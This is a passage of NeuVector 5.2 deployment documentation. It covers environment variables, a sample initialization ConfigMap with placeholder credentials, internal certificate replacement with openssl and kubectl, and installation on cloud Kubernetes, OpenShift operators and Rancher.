and record events to change the default admin password if it is not changed from default.  CTRL_EN_ICMP_POLICY  (Optional) When enabled (value=1) icmp traffic can be learned in discover mode, and policy can be generated. If there is no network policy in monitor or protect mode for the group, an implicit violation will be generated for icmp traffic.  Manager​  CTRL_SERVER_IP  (Optional for all-in-one) Controller REST server IP address. Default is 127.0.0.1. For all-in-one container, leave it as default. If the Manager is running separately, the Manager must specify this IP to connect to the controller.  CTRL_SERVER_PORT  (Optional for all-in-one) Controller REST server port. Default is 10443. For all-in-one container, leave it as default. If the Manager is running separately, the Manager should specify this variable to connect to the controller.  MANAGER_SERVER_PORT  (Optional) Manager UI port. Default is 8443. Unless the Manager is running in host mode, leave it and user docker port option to map the port on the host.  MANAGER_SSL  (Optional) Manager by default uses and HTTPS/SSL connection. Set the value to “off” to use HTTP.  Enforcer​  CONTAINER_NET_TYPE  (Optional) To support special network plug-in set value to &quot;macvlan”  ENF_NO_SECRET_SCANS  (Optional) Set the value to “1” to disable scanning for secrets in files (improves performance).  ENF_NO_AUTO_BENCHMARK  (Optional) Set the value to “1” to disable CIS benchmarks on host and containers (improves performance).  ENF_NO_SYSTEM_PROFILES  (Optional) Set the value to &quot;1&quot; to disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.  ENF_NETPOLICY_PULL_INTERVAL  (Optional) Value in seconds (recommended value 60) to reduce network traffic and resource consumption by Enforcer due to policy updates/recalculations, in clusters with high node counts or workloads. Default is zero, meaning no delay in updating Enforcer policy.  THRT_SSL_TLS_1DOT0  (Optional) Set the value to “1” to enable the detection for TLS Version 1.0 (Deprecated).  THRT_SSL_TLS_1DOT1  (Optional) Set the value to “1” to enable the detection for TLS Version 1.1 (Deprecated).  NV_SYSTEM_GROUPS  (Optional) Specify what groups or namespaces that NeuVector considers to be 'system containers', separated by semi-colons. For example, for Rancher-based apps and the default namespace, NV_SYSTEM_GROUPS=*cattle-system;*default. These values are translated in regex. System containers (which also include NeuVector and Kubernetes system containers) operate only in Monitor mode (alert only) even if the group is set to Protect mode.  ","version":"5.2","tagName":"h3"},{"title":"Open Ports​","type":1,"pageTitle":"Environment Variables Details","url":"/5.2/deploying/production/details#open-ports","content":" CLUSTER_RPC_PORT - on controller and all-in-one. Default 18300.CLUSTER_LAN_PORT - on controller, enforcer and all-in-one. Default 18301.MANAGER_SERVER_PORT - on manager or all-in-one. Default 8443.CTRL_SERVER_PORT - on controller. Default 10443.  Please see the section Deployment Preparation for a full description of the port communication requirements for the NeuVector containers. ","version":"5.2","tagName":"h3"},{"title":"Deploy Using ConfigMap","type":0,"sectionRef":"#","url":"/5.2/deploying/production/configmap","content":"","keywords":"","version":"5.2"},{"title":"Kubernetes ConfigMap​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/5.2/deploying/production/configmap#kubernetes-configmap","content":" NeuVector supports automated deployment using the Kubernetes ConfigMap feature. This enables deployment of NeuVector containers with the appropriate configurations, integrations, and other settings in an automated way.  The 'always_reload: true' setting can be added in any ConfigMap yaml to force reload of that yaml every time the controller starts (version 4.3.2+). Otherwise, the ConfigMap will only be loaded at initial startup or after complete cluster restart (see persistent storage section below).  Complete Sample NeuVector ConfigMap (initcfg.yaml)​  The latest ConfigMap can be found here.  The sample is also shown below. This contains all the settings available. Please remove the sections not needed and edit the sections needed. Note: If using configmap in a secret, see section below for formatting changes.  apiVersion: v1 data: passwordprofileinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false active_profile_name: default pwd_profiles: # only default profile is supported. - name: default comment: default from configMap min_len: 6 min_uppercase_count: 0 min_lowercase_count: 0 min_digit_count: 0 min_special_count: 0 enable_block_after_failed_login: false block_after_failed_login_count: 0 block_minutes: 0 enable_password_expiration: false password_expire_after_days: 0 enable_password_history: false password_keep_history_count: 0 # Optional. value between 30 -- 3600 default 300 session_timeout: 300 roleinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false roles: # Optional. - Comment: test role # Mandatory. name can have ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$ Name: testrole # Mandatory Permissions: - id: config read: true write: true - id: rt_scan read: true write: true - id: reg_scan read: true write: true - id: ci_scan write: true - id: rt_policy read: true write: true - id: admctrl read: true write: true - id: compliance read: true write: true - id: audit_events read: true - id: security_events read: true - id: events read: true - id: authentication read: true write: true - id: authorization read: true write: true ldapinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory. OpenLDAP or MicrosoftAD directory: OpenLDAP # Mandatory. Hostname: 1.2.3.4 # Optional. the default value is 389 Port: 389 # Optional true or false or empty string(false) SSL: false # Mandatory. base_dn: cn=admin,dc=example,dc=org # Optional. bind_dn: dc=example,dc=org # Optional. bind_password: password # Optional. empty string(memberUid for openldap or member for windows ad) group_member_attr: # Optional. empty string(cn for openldap or sAMAccountName for windows ad) username_attr: # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 oidcinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory Issuer: https://... # Mandatory Client_ID: f53c56ec... # Mandatory Client_Secret: AyAixE3... # Optional. empty or string(group filter info) GroupClaim: # Optional. empty string(openid,profile,email) Scopes: - openid - profile - email # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 group_claim: groups samlinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory SSO_URL: https://... # Mandatory Issuer: https://... # Mandatory X509_Cert: | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- x509_cert_extra: - | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- # Optional. empty or string(group filter info) GroupClaim: # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 group_claim: groups sysinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Optional. Choose between Discover or Monitor or Protect or empty string(Discover) New_Service_Policy_Mode: Discover # Optional. zero-drift or basic or empty string(zero-drift) New_Service_Profile_Baseline: zero-drift # Optional. input valid ipv4 address or empty string Syslog_ip: 1.2.3.4 # Optional. input 17, 6 or 66 here for udp, tcp, tcp+tls or empty string(17) Syslog_IP_Proto: 17 # Optional. it is required when Syslog_IP_Proto is 66 only Syslog_Server_Cert: | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- # Optional. empty string(514) Syslog_Port: 514 # Optional. chose between Alert/Critical/Error/Warning/Notice/Info/Debug or empty string(Info) Syslog_Level: Info # Optional. true or false or empty string(false) Syslog_status: false Syslog_Categories: # Optional. can chose multiple between event/security-event/audit or empty string - event - security-event - audit Syslog_in_json: # Optional. true, false, empty, unconfigured. # true = In Json: checkbox enabled from Settings &gt; Configuration &gt; Syslog # false, empty, unconfigured = In Json: checkbox disabled from Settings &gt; Configuration &gt; Syslog # # Optional. true or false or empty string(false) Auth_By_Platform: false single_cve_per_syslog: false syslog_cve_in_layers: false # Optional Webhooks: - name: myslack url: http... type: Slack enable: true - name: mywebhook url: http... enable: true # Optional. empty string Cluster_Name: cluster.local # Optional. chose multiple between cpath/mutex/conn/scan/cluster or empty string Controller_Debug: - cpath # Optional. true or false or empty string(true) Monitor_Service_Mesh: true # Optional. true or false or empty string(false) Registry_Http_Proxy_Status: false # Optional. true or false or empty string(false) Registry_Https_Proxy_Status: false # Optional. http/https registry proxy or empty string Registry_Http_Proxy: URL: http... Username: username Password: password Registry_Https_Proxy: URL: https... Username: username Password: password Xff_Enabled: true Net_Service_Status: false Net_Service_Policy_Mode: Discover Scanner_Autoscale: # Optional. Choose between immediate or delayed or empty string Strategy: Min_Pods: 1 Max_Pods: 3 # Optional. true or false or empty string(false) No_Telemetry_Report: false Scan_Config: # Optional. true or false or empty string(false) Auto_Scan: false # Optional. default value is 24. unit is hour and range is between 0 and 168 Unused_Group_Aging: 24 userinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false users: # add multiple users below - # this user will be added # Optional. EMail: user1@email.com # Mandatory. username can have ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$ Fullname: user1 # Optional. en or zh_cn or empty string(en) Locale: en # Optional. password length minimal 6, don't lead with ]`}*|&lt;&gt;!% Password: password # Optional. admin or reader or empty string(none) Role: reader # Optional. admin group or reader group or empty string Role_Domains: admin: - admin1 - admin2 reader: - reader1 - reader2 # Optional. value between 30 -- 3600 default 300 Timeout: 300 - # this user will overwrite the original admin user Fullname: admin Password: password Role: admin kind: ConfigMap metadata: name: neuvector-init namespace: neuvector   Then create the ConfigMap object:  kubectl create -f initcfg.yaml   ","version":"5.2","tagName":"h3"},{"title":"Protect Sensitive Data Using a Secret​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/5.2/deploying/production/configmap#protect-sensitive-data-using-a-secret","content":" If sensitive data is to be included in some sections of the configmap, a secret can be created for those sections with sensitive data.  For example, create the configMap for NON-sensitive sections such as passwordProfile and role:  kubectl create configmap neuvector-init --from-file=$HOME/init/passwordprofileinitcfg.yaml --from-file=$HOME/init/roleinitcfg.yaml -n neuvector   Then create a secret for sections with sensitive data, such as:  kubectl create secret generic neuvector-init --from-file=$HOME/init/eulainitcfg.yaml --from-file=$HOME/init/ldapinitcfg.yaml --from-file=$HOME/init/oidcinitcfg.yaml --from-file=$HOME/init/samlinitcfg.yaml --from-file=$HOME/init/sysinitcfg.yaml --from-file=$HOME/init/userinitcfg.yaml -n neuvector   important Remove the the pipe '|' character in each section, as shown below.  Note the removal of the pipe character below if using configmap sections in a secret, enabled set to true, and uncomment out the section to be included in the secret.  secret: # NOTE: files defined here have preferrence over the ones defined in the configmap section enabled: true data: eulainitcfg.yaml: license_key: 0Bca63Iy2FiXGqjk... # ... # ldapinitcfg.yaml: # directory: OpenLDAP # ... # oidcinitcfg.yaml: # Issuer: https://... # ... # samlinitcfg.yaml: # ... # sysinitcfg.yaml: # ... # userinitcfg.yaml: # ...   After controller is deployed, all the configuration files from both configmap and secret will be stored in /etc/config folder.  Note that the secret is referred to in the standard Kubernetes and OpenShift Controller deployment yaml files under Volumes.  ","version":"5.2","tagName":"h3"},{"title":"ConfigMaps and Persistent Storage​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/5.2/deploying/production/configmap#configmaps-and-persistent-storage","content":" Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage. ","version":"5.2","tagName":"h3"},{"title":"Replacing Internal Certificates","type":0,"sectionRef":"#","url":"/5.2/deploying/production/internal","content":"","keywords":"","version":"5.2"},{"title":"Internal Communication and Certificates​","type":1,"pageTitle":"Replacing Internal Certificates","url":"/5.2/deploying/production/internal#internal-communication-and-certificates","content":" NeuVector includes default self-signed certificates for encryption for the Manager (console/UI access), Controller (REST API, internal), Enforcer (internal), and Scanner (internal) communications.  These certificates can be replaced by your own to further harden communication. For replacing certificates used by external access to NeuVector (i.e, browser to the Manager, or REST API to the Controller), please see this section. See below for replacing the certificates used in internal communication between NeuVector containers.  WARNING: Replacing certificates is recommended to be performed only during initial deployment of NeuVector. Replacing on a running cluster (even with rolling upgrade) may result in an unstable state where NeuVector pods are unable to communicate with each other due to a mismatch in certificates, and DATA LOSS may occur.  Replacing Certificates Used in Internal Communications of NeuVector​  To replace the internal encryption files ca.cert, cert.key, cert.pem, first create the new ca.cfg file (see sample below). Then delete the relevant file, kubernetes secret, then generate new files and secret.  kubectl delete secret internal-cert -n neuvector openssl genrsa -out ca.key 2048 openssl req -x509 -sha256 -new -nodes -key ca.key -days 3650 -out ca.cert openssl genrsa -out cert.key 2048 openssl req -new -key cert.key -sha256 -out cert.csr -config ca.cfg openssl req -in cert.csr -noout -text openssl x509 -req -sha256 -in cert.csr -CA ca.cert -CAkey ca.key -CAcreateserial -out cert.pem -days 3650 -extfile ca.cfg // for sample ca.cfg see below, or see https://open-docs.neuvector.com/configuration/console/replacecert openssl x509 -in cert.pem -text kubectl create secret generic internal-cert -n neuvector --from-file=cert.key --from-file=cert.pem --from-file=ca.cert   Then edit the Controller, Enforcer, and Scanner deployment yamls, adding:   containers: - name: neuvector-controller/enforcer/scanner-pod volumeMounts: - mountPath: /etc/neuvector/certs/internal/cert.key name: internal-cert readOnly: true subPath: cert.key - mountPath: /etc/neuvector/certs/internal/cert.pem name: internal-cert readOnly: true subPath: cert.pem - mountPath: /etc/neuvector/certs/internal/ca.cert name: internal-cert readOnly: true subPath: ca.cert volumes: - name: internal-cert secret: defaultMode: 420 secretName: internal-cert   Then proceed to deploy NeuVector as before. You can also shell into the controller/enforcer/scanner pods to confirm that the ca.cert, cert.key, cert.pem files are the customized ones and that the NeuVector communications are working using the new certificates.  Sample ca.cfg file referenced above:  [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   Sample patch commands for controller (change namespace to cattle-neuvector-system if needed, and modify for use on enforcer, scanner):  NAMESPACE=neuvector kubectl patch deployment -n ${NAMESPACE} neuvector-controller-pod --type='json' -p='[{&quot;op&quot;: &quot;add&quot;, &quot;path&quot;: &quot;/spec/template/spec/volumes/-&quot;, &quot;value&quot;: {&quot;name&quot;: &quot;internal-cert&quot;, &quot;secret&quot;: {&quot;defaultMode&quot;: 420, &quot;secretName&quot;: &quot;internal-cert&quot;}} } ]' kubectl patch deployment -n ${NAMESPACE} neuvector-controller-pod --type='json' -p='[{&quot;op&quot;: &quot;add&quot;, &quot;path&quot;: &quot;/spec/template/spec/containers/0/volumeMounts&quot;, &quot;value&quot;: [{&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/cert.key&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;cert.key&quot;}, {&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/cert.pem&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;cert.pem&quot;}, {&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/ca.cert&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;ca.cert&quot;} ] } ]'   Updating/Deploying with Helm​  As of Helm chart 2.4.1 we can now manage the internal certificate install. The chart values.yaml should be reviewed for all the settings. The below example uses RKE2, standard Ingress and installer certificates.  # add chart helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update chart helm repo update # add domain for ingress export domain=awesome.sauce # run the helm helm upgrade -i neuvector -n neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set manager.ingress.host=neuvector.$domain --set manager.svc.type=ClusterIP --set controller.pvc.enabled=true --set controller.pvc.capacity=500Mi --set controller.internal.certificate.secret=internal-cert --set cve.scanner.internal.certificate.secret=internal-cert --set enforcer.internal.certificate.secret=internal-cert  ","version":"5.2","tagName":"h3"},{"title":"Public Cloud K8s AKS, EKS, GKE, IBM...","type":0,"sectionRef":"#","url":"/5.2/deploying/publick8s","content":"","keywords":"","version":"5.2"},{"title":"Deploy NeuVector on a Public Cloud Kubernetes Service​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/5.2/deploying/publick8s#deploy-neuvector-on-a-public-cloud-kubernetes-service","content":" Deploy NeuVector on any public cloud K8s service such as AWS EKS, Azure AKS, IBM Cloud K8s, Google Cloud, Alibaba Cloud or Oracle Cloud. NeuVector has passed the Amazon EKS Anywhere Conformance and Validation Framework and, as such, is a validated solution and is available as an Add-on for EKS-Anywhere on Snowball Edge devices through the AWS Console.  First, create your K8s cluster and confirm access with kubectl get nodes.  To deploy NeuVector use the sample deployment instructions and examples from the Kubernetes section of the Production Deployment. Edit the sample yaml if you are pulling NeuVector images from a local or cloud registry such as ECR or ACR.  Some cloud providers have integrated load balancers which are easy to deploy by using Type: LoadBalancer instead of NodePort for the NeuVector webui.  NeuVector also supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Network Access​  Make sure internal and external ingress access is configured properly. For the NodePort service, the random port in the 3xxxx range must be accessible on a public IP of a worker or master node from the outside. You can access the console using the public IP address of any worker node and that port (NodePort), or the public IP of the load balancer and default port 8443. You can view the IP/port using:  kubectl get svc -n neuvector   Most K8s services automatically enable/allow all inter-pod / inter-cluster communication between nodes which also enable the NeuVector containers (enforcers, controllers, manager) to communicate within the cluster.  The sample Kubernetes yaml file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  ","version":"5.2","tagName":"h3"},{"title":"Microsoft Azure AKS​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/5.2/deploying/publick8s#microsoft-azure-aks","content":" When deploying a k8s cluster on Azure, the default for Kubernetes RBACs is off. Please enable RBACs to enable the cluster-admin clusterrole, otherwise you will need to create that manually later to support Helm based deployments.  ","version":"5.2","tagName":"h3"},{"title":"Google Cloud Platform / GKE​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/5.2/deploying/publick8s#google-cloud-platform--gke","content":" You can use the integrated load balancers which are easy to deploy by using ‘Type: LoadBalancer’ instead of NodePort for the NeuVector webui. Configuring persistent storage with type RWM (read write many) may require creating a storage service such as NFS before deploying NeuVector.  NeuVector requires an SDN plug-in such as flannel, weave, or calico.  Use the environment variable NV_PLATFORM_INFO with value platform=Kubernetes:GKE to enable NeuVector to perform GKE specific action such as running the GKE Kubernetes CIS Benchmarks.  ","version":"5.2","tagName":"h3"},{"title":"Handling Auto-Scaling Nodes with a Pod Disruption Budget​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/5.2/deploying/publick8s#handling-auto-scaling-nodes-with-a-pod-disruption-budget","content":" Public cloud providers support the ability to auto-scale nodes, which can dynamically evict pods including the NeuVector controllers. To prevent disruptions to the controllers, a NeuVector pod disruption budget can be created.  For example, create the file below nv_pdr.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   Then  kubectl create -f nv_pdr.yaml   For more details: https://kubernetes.io/docs/tasks/run-application/configure-pdb/ ","version":"5.2","tagName":"h3"},{"title":"Deploy Using Operators","type":0,"sectionRef":"#","url":"/5.2/deploying/production/operators","content":"","keywords":"","version":"5.2"},{"title":"Operators​","type":1,"pageTitle":"Deploy Using Operators","url":"/5.2/deploying/production/operators#operators","content":" Operators take human operational knowledge and encode it into software that is more easily shared with consumers. Operators are pieces of software that ease the operational complexity of running another piece of software. More technically, Operators are a method of packaging, deploying, and managing a Kubernetes application.  ","version":"5.2","tagName":"h3"},{"title":"NeuVector Operators​","type":1,"pageTitle":"Deploy Using Operators","url":"/5.2/deploying/production/operators#neuvector-operators","content":" The NeuVector Operator is based on the NeuVector Helm chart. The NeuVector RedHat OpenShift Operator runs in the OpenShift container platform to deploy and manage the NeuVector Security cluster components. The NeuVector Operator contains all necessary information to deploy NeuVector using Helm charts. You simply need to install the NeuVector operator from the OpenShift embedded Operator hub and create the NeuVector instance.  To deploy the latest NeuVector container versions, please use either the Red Hat Certified Operator from Operator Hub or the community operator. Documentation for the community operator can be found here.  Note about SCC and Upgrading  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged   important NeuVector Certified Operator versions are tied to NeuVector product versions, and each new version must go through a certification process with Red Hat before being published. Certified operator version 1.3.9 is tied to NeuVector version 5.2.0. Certified operator version 1.3.7 is tied to NeuVector version 5.1.0. Version 1.3.4 operator version is tied to NeuVector 5.0.0. If you wish to be able to change the version tags of the NeuVector containers deployed, please use the Community version.  Deploy Using Certified Operator Deploy Using the Red Hat Certified Operator from Operator Hub important NeuVector Operator versions are tied to NeuVector product versions, and each new product version must go through a certification process with Red Hat before being published. Technical notes NeuVector container images are pulled from registry.connect.redhat.com using the RedHat market place image pull secret.The NeuVector manager UI is typically exposed via an OpenShift passthrough route on a domain. For example, on IBM Cloud neuvector-route-webui-neuvector.(cluster_name)-(random_hash)-0000.(region).containers.appdomain.cloud. It can also be exposed as the service neuvector-service-webui through a node port address or public IP.OpenShift version &gt;=4.6. Create the project neuvector. oc new-project neuvector Apply security context constraint (SCC) to grant default service account in neuvector namespace to run privileged containers. oc adm policy add-scc-to-user privileged --serviceaccount default --namespace neuvector Install the RedHat Certified Operator from the Operator Hub In the OpenShift Console UI, navigate to OperatorHubSearch for NeuVector Operator and select the listing without community or marketplace badgeClick Install Configure update channel Current latest channel is beta, but may be moved to stable in the futureSelect stable if available Configure installation mode and installed namespace Select specific namespace on the clusterSelect neuvector as installed namespaceConfigure approval strategy Confirm Install Prepare the YAML configuration values for the NeuVector installation as shown in the sample screen shot below. The YAML presented in the OpenShift Console provides all available configuration options and their default values. When the operator is installed and ready for use, a NeuVector instance can be installed. Click View operator (after the operator installation) or select the NeuVector Operator from the Installed operators viewClick Create instanceSelect Configure via YAML ViewPaste the prepared YAML configuration valuesClick Create Verify the installation of the NeuVector instance Navigate to the Operator Details of the NeuVector OperatorOpen the NeuVector tabSelect the neuvector-default instanceOpen the Resources tabVerify that resources are in status Created or Running After you have successfully deployed the NeuVector Platform to your cluster, login to the NeuVector console at https://neuvector-route-webui-neuvector.(OC_INGRESS). Login with the initial username admin and password admin.Accept the NeuVector end user license agreement.Change the password of the admin user. Optionally, you can also create additional users in the Settings -&gt; Users &amp; Roles menu. Now you are ready to navigate the NeuVector console to start vulnerability scanning, observe running application pods, and apply security protections to containers. Upgrading NeuVector Upgrade the NeuVector version by updating the Operator version which is associated with the desired NeuVector version.  Deploy Using Community Operator Deploy Using the NeuVector Community Operator from Operator Hub Technical notes NeuVector container images are pulled from Docker Hub from the NeuVector account.NeuVector manager UI is typically exposed via an OpenShift passthrough route on a domain. For example, on IBM Cloud neuvector-route-webui-neuvector.(cluster_name)-(random_hash)-0000.(region).containers.appdomain.cloud. It can also be exposed as the service neuvector-service-webui through a node port address or public IP.OpenShift version 4.6+It is recommendeded to review and modify the NeuVector installation configuration by modifying the yaml values before creating the NeuVector instance. Examples include imagePullSecrets name, tag version, ingress/console access, multi-cluster federation, persistent volume PVC etc. Please refer to the Helm instructions at https://github.com/neuvector/neuvector-helm for the values that can be modified during installation. Create the project neuvector oc new-project neuvector Apply security context constraint (SCC) to grant default service account in neuvector namespace to run privileged containers. oc adm policy add-scc-to-user privileged --serviceaccount default --namespace neuvector Install the NeuVector Community Operator from the Operator Hub In the OpenShift Console UI, navigate to OperatorHubSearch for NeuVector Operator and select the listing with the community badgeClick InstallConfigure update channel. Current latest channel is beta, but may be moved to stable in the future. Select stable if available.Configure installation mode and installed namespaceSelect specific namespace on the clusterSelect neuvector as installed namespaceConfigure approval strategyConfirm Install Download the Kubernetes secret manifest which contains the credentials to access the NeuVector container registry. Save the YAML manifest file to ./neuvector-secret-registry.yaml. Apply the Kubernetes secret manifest containing the registry credentials. kubectl apply -n neuvector -f ./neuvector-secret-registry.yaml Prepare the YAML configuration values for the NeuVector installation starting from the following YAML snippet. Be sure to specify the desired NeuVector version in the 'tag' value. Check the reference of values in the NeuVector Helm chart to get available configuration options. There are other possible Helm values which can be configured in the YAML, such as whether you will configure the cluster to allow multi-cluster management by exposing the Master (Federated Master) or remote (Federated Worker) services. apiVersion: apm.neuvector.com/v1alpha1 kind: Neuvector metadata: name: neuvector-default namespace: neuvector spec: openshift: true tag: 4.3.0 registry: docker.io exporter: image: repository: prometheus-exporter tag: 0.9.0 manager: enabled: true env: ssl: true image: repository: manager svc: type: ClusterIP route: enabled: true termination: passthrough enforcer: enabled: true image: repository: enforcer cve: updater: enabled: true image: repository: updater tag: latest schedule: 0 0 * * * scanner: enabled: true replicas: 3 image: repository: scanner tag: latest controller: enabled: true image: repository: controller replicas: 3 When the operator is installed and ready for use, a NeuVector instance can be installed. Click View operator (after the operator installation) or select the NeuVector Operator from the Installed operators viewClick Create instanceSelect Configure via YAML ViewPaste the prepared YAML configuration valuesClick Create Verify the installation of the NeuVector instance. Navigate to the Operator Details of the NeuVector OperatorOpen the NeuVector tabSelect the neuvector-default instanceOpen the Resources tabVerify that resources are in status Created or Running After you have successfully deployed the NeuVector Platform to your cluster, login to the NeuVector console at https://neuvector-route-webui-neuvector.(INGRESS_DOMAIN). Login with the initial username admin and password admin.Accept the NeuVector end user license agreement.Change the password of the admin user.Optionally, you can also create additional users in the Settings -&gt; Users &amp; Roles menu. Now you are ready to navigate the NeuVector console to start vulnerability scanning, observe running application pods, and apply security protections to containers. Upgrading NeuVector From Operators &gt; Installed Operators &gt; NeuVector Operator Click on NeuVector to list instances Click on YAML to edit parameters Update tag and click Save  ","version":"5.2","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Deploy Using Operators","url":"/5.2/deploying/production/operators#troubleshooting","content":" Check the Operator deployment values in the deployed yaml fileVerify that security context constraint (SCC) for NeuVector in step 2 was successfully addedReview and check the NeuVector Helm chart valuesMake sure the registry path and version tag is set properly (community operator; certified will use the defaults)Make sure the route to the NeuVector manager service neuvector-route-webui is configured ","version":"5.2","tagName":"h3"},{"title":"Rancher Deployment","type":0,"sectionRef":"#","url":"/5.2/deploying/rancher","content":"","keywords":"","version":"5.2"},{"title":"Deploy and Manage NeuVector through Rancher Apps & Marketplace​","type":1,"pageTitle":"Rancher Deployment","url":"/5.2/deploying/rancher#deploy-and-manage-neuvector-through-rancher-apps--marketplace","content":" NeuVector is able to be deployed easily through Rancher Apps and Marketplace and managed through Rancher Manager. The default (Helm-based) NeuVector deployment will deploy NeuVector containers into the cattle-neuvector-system namespace.  Note: Only NeuVector deployments through Apps &amp; Marketplace of Rancher version 2.6.5+ can be managed directly (single sign on to NeuVector console) through Rancher. If adding clusters to Rancher with NeuVector already deployed, or where NeuVector has been deployed directly onto the cluster, these clusters will not be enabled for SSO integration.  Deploy NeuVector​  First, find the NeuVector chart in Rancher charts, select it and review the instructions and various configuration values. (Optional) Create a project to deploy into if desired, e.g. NeuVector. Note: If you see more than one NeuVector chart, don't select the one that is for upgrading legacy NeuVector 4.x Helm chart deployments.    Deploy the NeuVector chart, first configuring appropriate values for a Rancher deployment, such as:  Container run-time, e.g. docker for RKE and containerd for RKE2, or select the K3s value if using K3s.Manager service type: change to LoadBalancer if available on public cloud deployments. If access is only desired through Rancher, any allowed value will work here. See the Important note below about changing the default admin password in NeuVector.Indicate if this cluster will be either a multi-cluster federated Primary, or remote (or select both if either option is desired).Persistent volume for configuration backups    Click 'Install' after you have reviewed and updated any chart values.  After successful NeuVector deployment, you will see a summary of the deployments, daemon sets, and cron job for NeuVector. You will also be able to see the services deployed in the Services Discovery menu on the left.    Manage NeuVector​  You will now see a NeuVector menu item in the left, and selecting that will show a NeuVector tile/button, which when clicked will take you to the NeuVector console, in a new tab.    When this Single Sign On (SSO) access method is used for the first time, a corresponding user in the NeuVector cluster is created for the Rancher user login. The same user name of the Rancher logged in user will be created in NeuVector, with a role of either admin or fedAdmin, and Identity provider as Rancher.    Note in the above screen shot, two Rancher users admin and gkosaka have been automatically created for SSO. If another user is create manually in NeuVector, the Identity provider would be listed as NeuVector, as 